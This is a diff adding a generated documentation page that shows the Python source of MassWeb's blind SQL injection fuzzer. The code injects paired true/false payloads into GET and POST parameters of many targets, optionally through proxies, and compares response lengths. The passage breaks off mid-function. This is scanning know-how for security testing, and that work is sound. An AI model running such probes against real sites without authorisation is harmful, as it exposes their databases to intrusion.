@@ -1,0 +1,386 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    
+    <title>massweb.fuzzers.bsqli_fuzzer &mdash; MassWeb 0.3.1 documentation</title>
+    
+    <link rel="stylesheet" href="../../../_static/alabaster.css" type="text/css" />
+    <link rel="stylesheet" href="../../../_static/pygments.css" type="text/css" />
+    
+    <script type="text/javascript">
+      var DOCUMENTATION_OPTIONS = {
+        URL_ROOT:    '../../../',
+        VERSION:     '0.3.1',
+        COLLAPSE_INDEX: false,
+        FILE_SUFFIX: '.html',
+        HAS_SOURCE:  true
+      };
+    </script>
+    <script type="text/javascript" src="../../../_static/jquery.js"></script>
+    <script type="text/javascript" src="../../../_static/underscore.js"></script>
+    <script type="text/javascript" src="../../../_static/doctools.js"></script>
+    <link rel="top" title="MassWeb 0.3.1 documentation" href="../../../index.html" />
+    <link rel="up" title="Module code" href="../../index.html" />
+   
+  
+  <meta name="viewport" content="width=device-width, initial-scale=0.9, maximum-scale=0.9">
+
+  </head>
+  <body>
+    <div class="related">
+      <h3>Navigation</h3>
+      <ul>
+        <li class="right" style="margin-right: 10px">
+          <a href="../../../genindex.html" title="General Index"
+             accesskey="I">index</a></li>
+        <li class="right" >
+          <a href="../../../py-modindex.html" title="Python Module Index"
+             >modules</a> |</li>
+        <li><a href="../../../index.html">MassWeb 0.3.1 documentation</a> &raquo;</li>
+          <li><a href="../../index.html" accesskey="U">Module code</a> &raquo;</li> 
+      </ul>
+    </div>  
+
+    <div class="document">
+      <div class="documentwrapper">
+        <div class="bodywrapper">
+          <div class="body">
+            
+  <h1>Source code for massweb.fuzzers.bsqli_fuzzer</h1><div class="highlight"><pre>
+<span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">division</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">codecs</span>
+<span class="kn">import</span> <span class="nn">logging</span>
+<span class="kn">import</span> <span class="nn">traceback</span>
+<span class="kn">from</span> <span class="nn">massweb.targets.target</span> <span class="kn">import</span> <span class="n">Target</span>
+<span class="kn">from</span> <span class="nn">massweb.targets.fuzzy_target</span> <span class="kn">import</span> <span class="n">FuzzyTarget</span>
+<span class="kn">from</span> <span class="nn">massweb.targets.fuzzy_target_group</span> <span class="kn">import</span> <span class="n">FuzzyTargetGroup</span>
+<span class="kn">from</span> <span class="nn">massweb.fuzzers.ifuzzer</span> <span class="kn">import</span> <span class="n">iFuzzer</span>
+<span class="kn">from</span> <span class="nn">massweb.fuzz_generators.url_generator</span> <span class="kn">import</span> <span class="n">generate_fuzzy_urls</span>
+<span class="kn">from</span> <span class="nn">massweb.mass_requests.mass_request</span> <span class="kn">import</span> <span class="n">MassRequest</span>
+<span class="kn">from</span> <span class="nn">massweb.payloads.payload</span> <span class="kn">import</span> <span class="n">Payload</span>
+<span class="kn">from</span> <span class="nn">logging</span> <span class="kn">import</span> <span class="n">StreamHandler</span>
+<span class="kn">from</span> <span class="nn">massweb.targets.fuzzy_target_group</span> <span class="kn">import</span> <span class="n">FuzzyTargetGroup</span>
+<span class="kn">from</span> <span class="nn">massweb.payloads</span> <span class="kn">import</span> <span class="n">bsqli_payload_group</span>
+<span class="kn">from</span> <span class="nn">massweb.targets</span> <span class="kn">import</span> <span class="n">fuzzy_target_group</span>
+<span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span><span class="n">format</span><span class="o">=</span><span class="s">&#39;</span><span class="si">%(asctime)s</span><span class="s"> </span><span class="si">%(name)s</span><span class="s">: </span><span class="si">%(message)s</span><span class="s">&#39;</span><span class="p">,</span> <span class="n">datefmt</span><span class="o">=</span><span class="s">&#39;%m/</span><span class="si">%d</span><span class="s">/%Y %I:%M:%S %p&#39;</span><span class="p">)</span>
+<span class="n">logger</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="s">&#39;BSQLIFuzzer&#39;</span><span class="p">)</span>
+<span class="n">logger</span><span class="o">.</span><span class="n">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">INFO</span><span class="p">)</span>
+<span class="n">sys</span><span class="o">.</span><span class="n">stdin</span> <span class="o">=</span> <span class="n">codecs</span><span class="o">.</span><span class="n">getreader</span><span class="p">(</span><span class="s">&#39;utf-8&#39;</span><span class="p">)(</span><span class="n">sys</span><span class="o">.</span><span class="n">stdin</span><span class="p">)</span>
+<span class="n">sys</span><span class="o">.</span><span class="n">stderr</span> <span class="o">=</span> <span class="n">codecs</span><span class="o">.</span><span class="n">getwriter</span><span class="p">(</span><span class="s">&#39;utf-8&#39;</span><span class="p">)(</span><span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">)</span>
+<span class="kn">from</span> <span class="nn">massweb.vuln_checks.match</span> <span class="kn">import</span> <span class="n">match_strings</span>
+<span class="kn">from</span> <span class="nn">massweb.vuln_checks.check</span> <span class="kn">import</span> <span class="n">Check</span>
+<span class="kn">from</span> <span class="nn">massweb.mass_requests.mass_request</span> <span class="kn">import</span> <span class="n">MassRequest</span>
+<span class="kn">from</span> <span class="nn">massweb.pnk_net.pnk_request</span> <span class="kn">import</span> <span class="n">pnk_request_raw</span>
+<span class="kn">from</span> <span class="nn">massweb.targets.target</span> <span class="kn">import</span> <span class="n">Target</span>
+<span class="kn">from</span> <span class="nn">requests</span> <span class="kn">import</span> <span class="n">Response</span>
+<span class="kn">from</span> <span class="nn">massweb.results.result</span> <span class="kn">import</span> <span class="n">Result</span> 
+<span class="kn">from</span> <span class="nn">massweb.mass_requests.response_analysis</span> <span class="kn">import</span> <span class="n">parse_worthy</span>
+<span class="kn">from</span> <span class="nn">massweb.payloads.bsqli_payload</span> <span class="kn">import</span> <span class="n">BSQLIPayload</span>
+<span class="kn">from</span> <span class="nn">massweb.payloads.bsqli_payload_group</span> <span class="kn">import</span> <span class="n">BSQLIPayloadGroup</span>
+<span class="kn">from</span> <span class="nn">urlparse</span> <span class="kn">import</span> <span class="n">urlparse</span>
+<span class="kn">from</span> <span class="nn">urlparse</span> <span class="kn">import</span> <span class="n">parse_qs</span>
+
+<div class="viewcode-block" id="BSQLiFuzzer"><a class="viewcode-back" href="../../../massweb.fuzzers.html#massweb.fuzzers.bsqli_fuzzer.BSQLiFuzzer">[docs]</a><span class="k">class</span> <span class="nc">BSQLiFuzzer</span><span class="p">(</span><span class="n">iFuzzer</span><span class="p">):</span>
+
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">targets</span><span class="p">,</span> <span class="n">bsqli_payload_groups</span> <span class="o">=</span> <span class="p">[],</span> <span class="n">num_threads</span> <span class="o">=</span> <span class="mi">10</span><span class="p">,</span> <span class="n">time_per_url</span> <span class="o">=</span> <span class="mi">10</span><span class="p">,</span> <span class="n">request_timeout</span> <span class="o">=</span> <span class="mi">10</span><span class="p">,</span> <span class="n">proxy_list</span> <span class="o">=</span> <span class="p">[{}],</span> <span class="n">hadoop_reporting</span> <span class="o">=</span> <span class="bp">False</span><span class="p">,</span> <span class="n">payload_groups</span> <span class="o">=</span> <span class="p">[]):</span>
+
+        <span class="c">#do this because we may need to create more MassRequest objects in checks (like bsqli), needs to be configured the same</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">mreq_config_dict</span> <span class="o">=</span> <span class="p">{</span><span class="s">&quot;num_threads&quot;</span> <span class="p">:</span> <span class="n">num_threads</span><span class="p">,</span> <span class="s">&quot;time_per_url&quot;</span> <span class="p">:</span> <span class="n">time_per_url</span><span class="p">,</span> <span class="s">&quot;request_timeout&quot;</span> <span class="p">:</span> <span class="n">request_timeout</span><span class="p">,</span> <span class="s">&quot;proxy_list&quot;</span> <span class="p">:</span> <span class="n">proxy_list</span><span class="p">,</span> <span class="s">&quot;hadoop_reporting&quot;</span> <span class="p">:</span> <span class="n">hadoop_reporting</span><span class="p">}</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">mreq</span> <span class="o">=</span> <span class="n">MassRequest</span><span class="p">(</span><span class="o">**</span><span class="bp">self</span><span class="o">.</span><span class="n">mreq_config_dict</span><span class="p">)</span>
+
+        <span class="bp">self</span><span class="o">.</span><span class="n">allowed_variance</span> <span class="o">=</span> <span class="mf">0.2</span>
+
+        <span class="bp">self</span><span class="o">.</span><span class="n">targets</span> <span class="o">=</span> <span class="n">targets</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">payload_groups</span> <span class="o">=</span> <span class="n">payload_groups</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">determine_posts_from_targets</span><span class="p">()</span>
+
+        <span class="bp">self</span><span class="o">.</span><span class="n">stable_targets</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">unstable_targets</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">hadoop_reporting</span> <span class="o">=</span> <span class="n">hadoop_reporting</span>
+        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">hadoop_reporting</span><span class="p">:</span>
+            <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&quot;Hadoop reporting set in fuzzer&quot;</span><span class="p">)</span>
+
+        <span class="bp">self</span><span class="o">.</span><span class="n">bsqli_payload_groups</span> <span class="o">=</span> <span class="n">bsqli_payload_groups</span>
+
+        <span class="k">for</span> <span class="n">target</span> <span class="ow">in</span> <span class="n">targets</span><span class="p">:</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">max_content_length_variance</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">__check_url_stability</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+                <span class="k">if</span> <span class="n">max_content_length_variance</span> <span class="o">&gt;</span> <span class="bp">self</span><span class="o">.</span><span class="n">allowed_variance</span><span class="p">:</span>
+                    <span class="k">if</span> <span class="n">hadoop_reporting</span><span class="p">:</span>
+                        <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">u&quot;Found unstable target </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">unicode</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
+                    <span class="bp">self</span><span class="o">.</span><span class="n">unstable_targets</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">u&quot;Found stable target </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">unicode</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
+                    <span class="bp">self</span><span class="o">.</span><span class="n">stable_targets</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+
+            <span class="k">except</span><span class="p">:</span>
+                <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">hadoop_reporting</span><span class="p">:</span>
+                    <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">u&quot;Found unstable target </span><span class="si">%s</span><span class="s"> due to exception:&quot;</span> <span class="o">%</span> <span class="nb">unicode</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
+
+                <span class="bp">self</span><span class="o">.</span><span class="n">unstable_targets</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+                                    
+    <span class="k">def</span> <span class="nf">__get_first_successful_response</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">results</span><span class="p">):</span>
+
+        <span class="k">for</span> <span class="n">index</span><span class="p">,</span> <span class="n">result</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">results</span><span class="p">):</span>
+            <span class="n">target</span><span class="p">,</span> <span class="n">response</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">result</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+            <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="n">Response</span><span class="p">):</span>                
+                <span class="n">response</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
+                <span class="k">if</span> <span class="ow">not</span> <span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
+                    <span class="k">continue</span>
+
+                <span class="k">return</span> <span class="n">index</span><span class="p">,</span> <span class="n">response</span>
+
+        <span class="k">return</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span>
+
+    <span class="k">def</span> <span class="nf">__check_url_stability</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">set_size</span> <span class="o">=</span> <span class="mi">10</span><span class="p">,</span> <span class="n">successful_compares_required</span> <span class="o">=</span> <span class="mi">6</span><span class="p">):</span>
+
+        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">hadoop_reporting</span><span class="p">:</span>
+            <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">u&quot;Determining stability for </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="nb">unicode</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
+        <span class="n">mreq</span> <span class="o">=</span> <span class="n">MassRequest</span><span class="p">(</span><span class="o">**</span><span class="bp">self</span><span class="o">.</span><span class="n">mreq_config_dict</span><span class="p">)</span>
+        <span class="n">targets</span> <span class="o">=</span> <span class="p">[</span><span class="n">target</span><span class="p">]</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">set_size</span><span class="p">):</span>
+            <span class="n">targets</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+
+        <span class="n">mreq</span><span class="o">.</span><span class="n">request_targets</span><span class="p">(</span><span class="n">targets</span><span class="p">)</span>
+        <span class="n">baseline_element_used</span><span class="p">,</span> <span class="n">baseline_response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">__get_first_successful_response</span><span class="p">(</span><span class="n">mreq</span><span class="o">.</span><span class="n">results</span><span class="p">)</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">baseline_response</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&quot;Didn&#39;t get a successful response from the URL, can&#39;t determine stability&quot;</span><span class="p">)</span>
+
+        <span class="c">#remove baseline element</span>
+        <span class="k">del</span> <span class="n">mreq</span><span class="o">.</span><span class="n">results</span><span class="p">[</span><span class="n">baseline_element_used</span><span class="p">]</span>
+
+        <span class="n">content_length_variance</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">mreq</span><span class="o">.</span><span class="n">results</span><span class="p">:</span>
+            <span class="n">target</span><span class="p">,</span> <span class="n">response</span> <span class="o">=</span> <span class="n">r</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">r</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="n">Response</span><span class="p">):</span>
+                <span class="k">continue</span>
+
+            <span class="n">content_length_variance</span><span class="o">.</span><span class="n">append</span><span class="p">(((</span><span class="mi">1</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">)</span><span class="o">/</span><span class="nb">len</span><span class="p">(</span><span class="n">baseline_response</span><span class="o">.</span><span class="n">content</span><span class="p">))</span> <span class="o">*</span> <span class="mi">100</span><span class="p">))</span>
+
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">content_length_variance</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">successful_compares_required</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&quot;Didn&#39;t get enough successful compares to determine stability&quot;</span><span class="p">)</span>
+
+        <span class="n">max_content_length_variance</span> <span class="o">=</span> <span class="nb">abs</span><span class="p">(</span><span class="nb">max</span><span class="p">(</span><span class="n">content_length_variance</span><span class="p">))</span>
+        <span class="k">return</span> <span class="n">max_content_length_variance</span>
+
+    <span class="k">def</span> <span class="nf">__build_get_fuzzy_target_group_from_payload_group</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">bsqli_payload_group</span><span class="p">):</span>
+
+        <span class="n">url</span> <span class="o">=</span> <span class="n">target</span><span class="o">.</span><span class="n">url</span>
+        <span class="n">parsed_url</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+        <span class="n">parsed_url_query</span> <span class="o">=</span> <span class="n">parsed_url</span><span class="o">.</span><span class="n">query</span>
+        <span class="n">url_q_dic</span> <span class="o">=</span> <span class="n">parse_qs</span><span class="p">(</span><span class="n">parsed_url_query</span><span class="p">)</span>
+
+        <span class="c">#i have no idea why an empty list has to be called to reinstantiate this object properly?</span>
+        <span class="n">fuzzy_target_groups</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="k">for</span> <span class="n">query_param</span><span class="p">,</span> <span class="n">query_val</span> <span class="ow">in</span> <span class="n">url_q_dic</span><span class="o">.</span><span class="n">iteritems</span><span class="p">():</span>
+
+            <span class="n">ftg</span> <span class="o">=</span> <span class="n">FuzzyTargetGroup</span><span class="p">()</span>
+            <span class="n">true_fuzzy_url</span> <span class="o">=</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">append_to_param</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">query_param</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">bsqli_payload_group</span><span class="o">.</span><span class="n">true_payload</span><span class="p">)))</span>
+            <span class="n">true_fuzzy_target</span> <span class="o">=</span> <span class="n">FuzzyTarget</span><span class="p">(</span><span class="n">true_fuzzy_url</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">query_param</span><span class="p">,</span> <span class="s">&quot;get&quot;</span><span class="p">,</span> <span class="n">payload</span> <span class="o">=</span> <span class="n">bsqli_payload_group</span><span class="o">.</span><span class="n">true_payload</span><span class="p">)</span>
+            <span class="n">ftg</span><span class="o">.</span><span class="n">add_target</span><span class="p">(</span><span class="n">true_fuzzy_target</span><span class="p">)</span>
+
+            <span class="n">false_fuzzy_url</span> <span class="o">=</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">append_to_param</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">query_param</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">bsqli_payload_group</span><span class="o">.</span><span class="n">false_payload</span><span class="p">)))</span>
+            <span class="n">false_fuzzy_target</span> <span class="o">=</span> <span class="n">FuzzyTarget</span><span class="p">(</span><span class="n">false_fuzzy_url</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">query_param</span><span class="p">,</span> <span class="s">&quot;get&quot;</span><span class="p">,</span> <span class="n">payload</span> <span class="o">=</span> <span class="n">bsqli_payload_group</span><span class="o">.</span><span class="n">false_payload</span><span class="p">)</span>
+
+            <span class="n">ftg</span><span class="o">.</span><span class="n">add_target</span><span class="p">(</span><span class="n">false_fuzzy_target</span><span class="p">)</span>
+            <span class="n">fuzzy_target_groups</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">ftg</span><span class="p">)</span>
+
+        <span class="k">return</span> <span class="n">fuzzy_target_groups</span>
+
+    <span class="k">def</span> <span class="nf">__build_post_fuzzy_target_group_from_payload_group</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">bsqli_payload_group</span><span class="p">):</span>
+
+        <span class="n">url</span> <span class="o">=</span> <span class="n">target</span><span class="o">.</span><span class="n">url</span>
+        <span class="n">post_keys</span> <span class="o">=</span> <span class="n">target</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">keys</span><span class="p">()</span>
+        <span class="c">#i have no idea why an empty list has to be called to reinstantiate this object properly?</span>
+        <span class="n">fuzzy_target_groups</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">post_keys</span><span class="p">:</span>
+
+            <span class="n">ftg</span> <span class="o">=</span> <span class="n">FuzzyTargetGroup</span><span class="p">()</span>
+            <span class="n">true_payload</span> <span class="o">=</span> <span class="n">bsqli_payload_group</span><span class="o">.</span><span class="n">true_payload</span>
+            <span class="n">data_copy</span> <span class="o">=</span> <span class="n">target</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">copy</span><span class="p">()</span>
+            <span class="n">data_copy</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">data_copy</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">true_payload</span><span class="p">)</span>
+            <span class="n">fuzzy_target</span> <span class="o">=</span> <span class="n">FuzzyTarget</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="s">&quot;post&quot;</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data_copy</span><span class="o">.</span><span class="n">copy</span><span class="p">(),</span> <span class="n">payload</span> <span class="o">=</span> <span class="n">true_payload</span><span class="p">,</span> <span class="n">unfuzzed_data</span> <span class="o">=</span> <span class="n">target</span><span class="o">.</span><span class="n">data</span><span class="p">)</span>
+            <span class="n">ftg</span><span class="o">.</span><span class="n">add_target</span><span class="p">(</span><span class="n">fuzzy_target</span><span class="p">)</span>
+
+            <span class="n">false_payload</span> <span class="o">=</span> <span class="n">bsqli_payload_group</span><span class="o">.</span><span class="n">false_payload</span>
+            <span class="n">data_copy</span> <span class="o">=</span> <span class="n">target</span><span class="o">.</span><span class="n">data</span><span class="o">.</span><span class="n">copy</span><span class="p">()</span>
+            <span class="n">data_copy</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">data_copy</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">false_payload</span><span class="p">)</span>
+            <span class="n">fuzzy_target</span> <span class="o">=</span> <span class="n">FuzzyTarget</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="s">&quot;post&quot;</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data_copy</span><span class="o">.</span><span class="n">copy</span><span class="p">(),</span> <span class="n">payload</span> <span class="o">=</span> <span class="n">false_payload</span><span class="p">,</span> <span class="n">unfuzzed_data</span> <span class="o">=</span> <span class="n">target</span><span class="o">.</span><span class="n">data</span><span class="p">)</span>
+            <span class="n">ftg</span><span class="o">.</span><span class="n">add_target</span><span class="p">(</span><span class="n">fuzzy_target</span><span class="p">)</span>
+
+            <span class="n">fuzzy_target_groups</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">ftg</span><span class="p">)</span>
+
+        <span class="k">return</span> <span class="n">fuzzy_target_groups</span>
+
+    <span class="k">def</span> <span class="nf">__build_fuzzy_target_groups</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+
+        <span class="bp">self</span><span class="o">.</span><span class="n">fuzzy_target_groups</span> <span class="o">=</span> <span class="p">[]</span>
+
+        <span class="k">for</span> <span class="n">bsqli_payload_group</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">bsqli_payload_groups</span><span class="p">:</span>
+            <span class="k">for</span> <span class="n">target</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">targets</span><span class="p">:</span>
+                <span class="k">if</span> <span class="n">target</span><span class="o">.</span><span class="n">ttype</span> <span class="o">==</span> <span class="s">&quot;get&quot;</span><span class="p">:</span>
+                    <span class="n">ftgs</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">__build_get_fuzzy_target_group_from_payload_group</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">bsqli_payload_group</span><span class="p">)</span>
+                <span class="k">elif</span> <span class="n">target</span><span class="o">.</span><span class="n">ttype</span> <span class="o">==</span> <span class="s">&quot;post&quot;</span><span class="p">:</span>
+                    <span class="n">ftgs</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">__build_post_fuzzy_target_group_from_payload_group</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">bsqli_payload_group</span><span class="p">)</span>
+
+                <span class="k">for</span> <span class="n">ftg</span> <span class="ow">in</span> <span class="n">ftgs</span><span class="p">:</span>
+                    <span class="bp">self</span><span class="o">.</span><span class="n">fuzzy_target_groups</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">ftg</span><span class="p">)</span>
+
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">fuzzy_target_groups</span>
+
+<div class="viewcode-block" id="BSQLiFuzzer.request_target_group"><a class="viewcode-back" href="../../../massweb.fuzzers.html#massweb.fuzzers.bsqli_fuzzer.BSQLiFuzzer.request_target_group">[docs]</a>    <span class="k">def</span> <span class="nf">request_target_group</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">fuzzy_target_group</span><span class="p">):</span>
+
+        <span class="n">mreq</span> <span class="o">=</span> <span class="n">MassRequest</span><span class="p">(</span><span class="o">**</span><span class="bp">self</span><span class="o">.</span><span class="n">mreq_config_dict</span><span class="p">)</span>
+        <span class="n">mreq</span><span class="o">.</span><span class="n">request_targets</span><span class="p">(</span><span class="n">fuzzy_target_group</span><span class="o">.</span><span class="n">fuzzy_targets</span><span class="p">)</span>
+
+        <span class="k">return</span> <span class="n">mreq</span><span class="o">.</span><span class="n">results</span>
+</div>
+<div class="viewcode-block" id="BSQLiFuzzer.check_for_bsqli"><a class="viewcode-back" href="../../../massweb.fuzzers.html#massweb.fuzzers.bsqli_fuzzer.BSQLiFuzzer.check_for_bsqli">[docs]</a>    <span class="k">def</span> <span class="nf">check_for_bsqli</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">fuzzy_target_group</span><span class="p">):</span>
+
+        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">hadoop_reporting</span><span class="p">:</span>
+            <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&quot;Checking for BlindSQL in </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">fuzzy_target_group</span><span class="o">.</span><span class="n">fuzzy_targets</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">unfuzzed_url</span><span class="p">)</span>
+
+        <span class="n">request_results</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">request_target_group</span><span class="p">(</span><span class="n">fuzzy_target_group</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">request_result</span> <span class="ow">in</span> <span class="n">request_results</span><span class="p">:</span>
+            <span class="n">fuzzy_target</span><span class="p">,</span> <span class="n">response</span> <span class="o">=</span> <span class="n">request_result</span>
+            <span class="k">if</span> <span class="n">fuzzy_target</span><span class="o">.</span><span class="n">payload</span><span class="o">.</span><span class="n">payload_attributes</span><span class="p">[</span><span class="s">&quot;truth&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="bp">True</span><span class="p">:</span>
+                <span class="n">true_target</span><span class="p">,</span> <span class="n">true_response</span> <span class="o">=</span> <span class="n">fuzzy_target</span><span class="p">,</span> <span class="n">response</span>
+
+            <span class="k">elif</span> <span class="n">fuzzy_target</span><span class="o">.</span><span class="n">payload</span><span class="o">.</span><span class="n">payload_attributes</span><span class="p">[</span><span class="s">&quot;truth&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
+                <span class="n">false_target</span><span class="p">,</span> <span class="n">false_response</span> <span class="o">=</span> <span class="n">fuzzy_target</span><span class="p">,</span> <span class="n">response</span>
+
+            <span class="k">else</span><span class="p">:</span>
+                <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&quot;BSQLI target doesn&#39;t have truth attribute&quot;</span><span class="p">)</span>        
+
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">true_content_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">true_response</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+            <span class="n">false_content_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">false_response</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&quot;Either the true or the false request failed and true_content_length and false_content_length were not set &quot;</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="n">true_content_length</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="o">*</span><span class="n">false_content_length</span><span class="p">:</span>
